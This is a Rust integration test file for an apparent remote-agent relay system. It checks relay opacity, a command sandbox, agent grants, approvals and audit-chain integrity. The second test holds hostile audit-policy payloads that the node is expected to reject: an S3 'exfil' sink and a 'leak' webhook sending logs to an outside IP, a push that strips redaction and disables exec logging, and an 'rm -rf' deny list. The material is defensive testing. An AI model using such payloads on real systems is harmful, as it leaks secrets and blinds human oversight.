//! End-to-end opacity, agent grants, the command sandbox, approvals, and the audit chain.

use std::sync::{Arc, Mutex};
use std::time::Duration;

use agentlink_core::audit::{verify_chain, AuditPolicy, AuditRecord};
use agentlink_core::{Client, ClientSettings, ExecRequest, Identity, NodePolicy};
use agentlink_node::{run, NodeConfig};
use agentlink_relay::{RelayConfig, RelayHandle};
use tokio_util::sync::CancellationToken;

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn security_controls() {
    let result = tokio::time::timeout(Duration::from_secs(60), flow()).await;
    match result {
        Ok(Ok(())) => {}
        Ok(Err(err)) => panic!("{err:#}"),
        Err(_) => panic!("security test timed out"),
    }
}

async fn flow() -> anyhow::Result<()> {
    let dir = tempfile::tempdir()?;
    let capture = Arc::new(Mutex::new(Vec::<Vec<u8>>::new()));
    let relay = RelayHandle::spawn(RelayConfig {
        bind: "127.0.0.1:0".parse()?,
        data_dir: dir.path().join("relay"),
        capture: Some(capture.clone()),
        database_url: None,
        allow_signup: false,
        bootstrap_admin: false,
        db_schema: None,
        trust_proxy: Vec::new(),
        print_admin_token: false,
        legacy_admin_override: Some((true, Some(86_400))),
    })
    .await?;
    let relay_url = format!("wss://{}/v1/connect", relay.local_addr);
    let admin = Client::connect(&ClientSettings {
        relay: relay_url.clone(),
        token: relay.admin_token.clone(),
        fingerprint: relay.fingerprint.clone(),
        trust: None,
    })
    .await?;

    let token = admin
        .create_pairing_token("box", NodePolicy::exec(), 600)
        .await?;
    let node_dir = dir.path().join("box");
    std::fs::create_dir_all(&node_dir)?;
    let mut policy = AuditPolicy::preset("standard")?;
    policy.forward.central = false;
    policy.lock_local = true;
    std::fs::write(node_dir.join("audit.toml"), policy.to_toml()?)?;
    std::fs::write(
        node_dir.join("limits.json"),
        r#"{"allow":[],"deny":["rm","rm *","*rm -rf*"]}"#,
    )?;
    std::fs::write(
        node_dir.join("confirm.toml"),
        "timeout_secs = 20\n[[rules]]\ncategory = \"exec\"\npattern = \"*held-marker*\"\n",
    )?;

    let stop = CancellationToken::new();
    let node = tokio::spawn(run(
        NodeConfig {
            relay_url: relay_url.clone(),
            fingerprint: relay.fingerprint.clone(),
            trust: None,
            data_dir: node_dir.clone(),
            name: "box".into(),
            pairing_token: Some(token.token),
            root: None,
            max_policy: NodePolicy::phase1_ceiling(),
            version: "test".into(),
            extensions: Vec::new(),
            policy_hook: None,
            capture: None,
        },
        stop.clone(),
    ));
    wait_online(&admin, "box").await;
    let ident = std::fs::read_to_string(node_dir.join("identity.json"))?;
    let box_id = serde_json::from_str::<serde_json::Value>(&ident)?
        .get("public_hex")
        .and_then(|item| item.as_str())
        .unwrap_or_default()
        .to_string();
    admin.install_local_grant(&node_dir, &box_id)?;
    assert!(
        admin.load_grant_for_node(&box_id)?.is_some(),
        "admin grant was not stored"
    );

    let secret_cmd = "echo SECRETCOMMANDVALUE";
    let output = admin
        .exec_collect(
            "box",
            ExecRequest::shell(secret_cmd, Some(Duration::from_secs(10))),
            None,
        )
        .await?;
    assert_eq!(output.exit_code, Some(0), "{output:?}");
    assert!(
        String::from_utf8_lossy(&output.stdout).contains("SECRETCOMMANDVALUE"),
        "the caller still sees its own output"
    );

    let remote = dir.path().join("secret.txt");
    let remote_s = remote.to_string_lossy().to_string();
    let bytes = b"SECRETFILEBYTES".to_vec();
    let mut cursor = std::io::Cursor::new(bytes.clone());
    admin
        .stream_upload(
            "box",
            &remote_s,
            &mut cursor,
            &agentlink_core::engine::XferOpts {
                transport: "relay-only".into(),
                ..agentlink_core::engine::XferOpts::default()
            },
        )
        .await?;
    assert_eq!(std::fs::read(&remote)?, bytes);

    let wire = capture
        .lock()
        .unwrap()
        .iter()
        .flat_map(|frame| String::from_utf8_lossy(frame).into_owned().into_bytes())
        .collect::<Vec<_>>();
    let wire = String::from_utf8_lossy(&wire);
    assert!(
        !wire.contains("SECRETCOMMANDVALUE"),
        "relay saw the command line"
    );
    assert!(!wire.contains("SECRETFILEBYTES"), "relay saw file bytes");
    assert!(
        wire.contains("e2e"),
        "expected an end-to-end envelope on the relay"
    );

    let denied = admin
        .exec_collect(
            "box",
            ExecRequest::shell(
                "rm -rf /tmp/agentlink-should-not-run",
                Some(Duration::from_secs(10)),
            ),
            None,
        )
        .await;
    assert!(denied.is_err(), "sandbox allowed rm");

    let identity = Identity::generate();
    admin.register_client("bot", identity.public_hex()).await?;
    admin
        .set_client_grant(identity.public_hex(), "box", NodePolicy::read_only())
        .await?;
    let agent = Client::connect_agent(
        &ClientSettings {
            relay: relay_url.clone(),
            token: String::new(),
            fingerprint: relay.fingerprint.clone(),
            trust: None,
        },
        identity,
    )
    .await?;
    let agent_list = agent.list_dir("box", ".").await;
    assert!(
        agent_list.is_err(),
        "a relay read-only preset is not a node-local grant"
    );
    let agent_exec = agent
        .exec_collect(
            "box",
            ExecRequest::shell("echo no", Some(Duration::from_secs(10))),
            None,
        )
        .await;
    assert!(agent_exec.is_err(), "read-only agent ran a command");

    let runner = Client::connect(&ClientSettings {
        relay: relay_url,
        token: relay.admin_token.clone(),
        fingerprint: relay.fingerprint.clone(),
        trust: None,
    })
    .await?;
    runner.install_local_grant(&node_dir, &box_id)?;
    let held = tokio::spawn(async move {
        runner
            .exec_collect(
                "box",
                ExecRequest::shell("echo held-marker", Some(Duration::from_secs(15))),
                None,
            )
            .await
    });
    let mut approval_id = None;
    for _ in 0..30 {
        let items = admin.list_approvals().await?;
        if let Some(item) = items
            .iter()
            .find(|item| item.summary.contains("held-marker"))
        {
            approval_id = Some(item.approval_id.clone());
            admin
                .resolve_approval(&item.approval_id, &item.node_id, true)
                .await?;
            break;
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    assert!(approval_id.is_some(), "held exec never asked for approval");
    let held = held.await??;
    assert_eq!(held.exit_code, Some(0), "{held:?}");

    let mut records = Vec::new();
    let logs = node_dir.join("audit").join("logs");
    for entry in std::fs::read_dir(&logs)? {
        let text = std::fs::read_to_string(entry?.path())?;
        for line in text.lines() {
            records.push(serde_json::from_str::<AuditRecord>(line)?);
        }
    }
    records.sort_by_key(|record| record.seq);
    verify_chain(&records)?;
    let legacy = std::fs::read_to_string(node_dir.join("audit.log"))?;
    assert!(legacy.contains("\"op\":\"exec\""), "{legacy}");

    stop.cancel();
    let _ = tokio::time::timeout(Duration::from_secs(5), node).await;
    Ok(())
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn untrusted_relay_audit_push_cannot_inject_egress_or_blind_legacy_unlocked_node() {
    let dir = tempfile::tempdir().expect("tempdir");
    let relay = RelayHandle::spawn(RelayConfig {
        bind: "127.0.0.1:0".parse().expect("bind"),
        data_dir: dir.path().join("relay"),
        capture: None,
        database_url: None,
        allow_signup: false,
        bootstrap_admin: false,
        db_schema: None,
        trust_proxy: Vec::new(),
        print_admin_token: false,
        legacy_admin_override: Some((true, Some(86_400))),
    })
    .await
    .expect("spawn relay");
    let relay_url = format!("wss://{}/v1/connect", relay.local_addr);
    let admin = Client::connect(&ClientSettings {
        relay: relay_url.clone(),
        token: relay.admin_token.clone(),
        fingerprint: relay.fingerprint.clone(),
        trust: None,
    })
    .await
    .expect("connect admin");

    // 1. Default preset node (no explicit lock_local override) must lock local audit by default.
    let fresh_tok = admin
        .create_pairing_token("fresh-box", NodePolicy::exec(), 600)
        .await
        .expect("pair fresh");
    let fresh_dir = dir.path().join("fresh-box");
    std::fs::create_dir_all(&fresh_dir).expect("mkdir fresh");
    let fresh_stop = CancellationToken::new();
    let fresh_task = tokio::spawn(run(
        NodeConfig {
            relay_url: relay_url.clone(),
            fingerprint: relay.fingerprint.clone(),
            trust: None,
            data_dir: fresh_dir.clone(),
            name: "fresh-box".into(),
            pairing_token: Some(fresh_tok.token),
            root: None,
            max_policy: NodePolicy::phase1_ceiling(),
            version: "test".into(),
            extensions: Vec::new(),
            policy_hook: None,
            capture: None,
        },
        fresh_stop.clone(),
    ));
    wait_online(&admin, "fresh-box").await;
    let mut benign = AuditPolicy::preset("standard").expect("preset");
    benign.lock_local = false;
    benign.recording.mode = "always".into();
    admin
        .set_audit_policy("fresh-box", None, &benign.to_toml().expect("toml"))
        .await
        .expect("relay push to fresh-box");
    tokio::time::sleep(Duration::from_millis(250)).await;
    assert!(
        !fresh_dir.join("audit.toml").exists(),
        "default node without lock_local=false must ignore unauthenticated relay audit push"
    );
    fresh_stop.cancel();
    let _ = tokio::time::timeout(Duration::from_secs(5), fresh_task).await;

    // 2. Upgraded legacy node with pre-existing `lock_local = false` in audit.toml on disk.
    let legacy_tok = admin
        .create_pairing_token("legacy-box", NodePolicy::exec(), 600)
        .await
        .expect("pair legacy");
    let legacy_dir = dir.path().join("legacy-box");
    std::fs::create_dir_all(&legacy_dir).expect("mkdir legacy");
    let legacy_initial = r#"preset = "standard"
lock_local = false
"#;
    std::fs::write(legacy_dir.join("audit.toml"), legacy_initial).expect("write legacy audit.toml");
    let legacy_stop = CancellationToken::new();
    let legacy_task = tokio::spawn(run(
        NodeConfig {
            relay_url: relay_url.clone(),
            fingerprint: relay.fingerprint.clone(),
            trust: None,
            data_dir: legacy_dir.clone(),
            name: "legacy-box".into(),
            pairing_token: Some(legacy_tok.token),
            root: None,
            max_policy: NodePolicy::phase1_ceiling(),
            version: "test".into(),
            extensions: Vec::new(),
            policy_hook: None,
            capture: None,
        },
        legacy_stop.clone(),
    ));
    wait_online(&admin, "legacy-box").await;

    // Attempt A: malicious S3 credential-exfiltration sink pushed over relay to lock_local=false node.
    let s3_exfil = r#"preset = "standard"
lock_local = false

[[sinks]]
name = "local"
kind = "local"
data = ["logs", "diffs", "recordings"]

[[sinks]]
name = "exfil"
kind = "s3"
data = ["logs"]
[sinks.s3]
bucket = "loot"
region = "us-east-1"
endpoint = "https://93.184.216.34/s3"
credentials = "env"
"#;
    admin
        .set_audit_policy("legacy-box", None, s3_exfil)
        .await
        .expect("relay accepts syntactically valid s3 policy");
    tokio::time::sleep(Duration::from_millis(250)).await;
    let on_disk = std::fs::read_to_string(legacy_dir.join("audit.toml")).expect("read audit.toml");
    assert!(
        !on_disk.contains("exfil") && !on_disk.contains("93.184.216.34"),
        "legacy lock_local=false node accepted untrusted S3 sink injection: {on_disk}"
    );

    // Attempt B: malicious alert webhook injection pushed over relay to lock_local=false node.
    let webhook_exfil = r#"preset = "standard"
lock_local = false

[[alerts]]
name = "leak"
webhook = "https://93.184.216.34/hook"
"#;
    admin
        .set_audit_policy("legacy-box", None, webhook_exfil)
        .await
        .expect("relay accepts syntactically valid public webhook policy");
    tokio::time::sleep(Duration::from_millis(250)).await;
    let on_disk = std::fs::read_to_string(legacy_dir.join("audit.toml")).expect("read audit.toml");
    assert!(
        !on_disk.contains("leak") && !on_disk.contains("93.184.216.34"),
        "legacy lock_local=false node accepted untrusted webhook injection: {on_disk}"
    );

    // Attempt C: stripping redaction or disabling local exec logging via untrusted relay push.
    let blind_push = r#"preset = "standard"
lock_local = false

[redact]
patterns = []
env_keys = []

[categories.exec]
enabled = false
detail = "off"
"#;
    admin
        .set_audit_policy("legacy-box", None, blind_push)
        .await
        .expect("relay accepts syntactically valid policy");
    tokio::time::sleep(Duration::from_millis(250)).await;
    let parsed = AuditPolicy::parse(
        &std::fs::read_to_string(legacy_dir.join("audit.toml")).expect("read audit.toml"),
    )
    .expect("parse on-disk audit.toml");
    assert!(
        parsed.categories.get("exec").is_some_and(|c| c.enabled),
        "untrusted relay push disabled local exec audit"
    );
    assert!(
        !parsed.redact.patterns.is_empty() && !parsed.redact.env_keys.is_empty(),
        "untrusted relay push stripped secret redaction"
    );

    // Benign push on explicit lock_local=false node: raising detail / enabling recording without egress.
    let mut safe_push = AuditPolicy::parse(legacy_initial).expect("parse legacy");
    safe_push.recording.mode = "always".into();
    safe_push
        .set_key("categories.file_write.detail", "diff")
        .expect("set detail");
    let safe_toml = safe_push.to_toml().expect("safe toml");
    admin
        .set_audit_policy("legacy-box", None, &safe_toml)
        .await
        .expect("relay benign push");
    let deadline = std::time::Instant::now() + Duration::from_secs(5);
    loop {
        let cur = AuditPolicy::parse(
            &std::fs::read_to_string(legacy_dir.join("audit.toml")).expect("read audit.toml"),
        )
        .expect("parse updated");
        if cur.recording.mode == "always" {
            assert!(!cur.lock_local);
            break;
        }
        assert!(
            std::time::Instant::now() < deadline,
            "benign detail upgrade did not apply on lock_local=false node"
        );
        tokio::time::sleep(Duration::from_millis(50)).await;
    }

    legacy_stop.cancel();
    let _ = tokio::time::timeout(Duration::from_secs(5), legacy_task).await;
}

async fn wait_online(admin: &Client, name: &str) {
    let deadline = std::time::Instant::now() + Duration::from_secs(15);
    loop {
        if admin
            .list_nodes()
            .await
            .ok()
            .map(|nodes| nodes.iter().any(|node| node.name == name && node.online))
            .unwrap_or(false)
        {
            return;
        }
        if std::time::Instant::now() > deadline {
            panic!("node {name} did not come online");
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
}
